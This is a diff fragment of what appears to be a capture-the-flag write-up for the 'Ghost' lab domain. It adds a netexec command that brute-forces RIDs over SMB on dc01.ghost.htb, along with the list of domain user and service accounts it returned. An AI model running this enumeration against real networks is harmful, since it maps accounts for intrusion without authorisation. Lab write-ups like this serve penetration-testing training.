@@ -759,6 +759,26 @@ SMB         dc01.ghost.htb  445    DC01             Users           READ
 
 Read access on the `Users` share
 
-
+```python
+nxc smb dc01.ghost.htb --use-kcache --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+GHOST-CORP$
+kathryn.holland
+cassandra.shelton
+robert.steeves
+florence.ramirez
+justin.bradley
+arthur.boyd
+beth.clark
+charles.gray
+jason.taylor
+intranet_principal
+gitea_temp_principal
+LINUX-DEV-WS01$
+adfs_gmsa$
+```
 
 
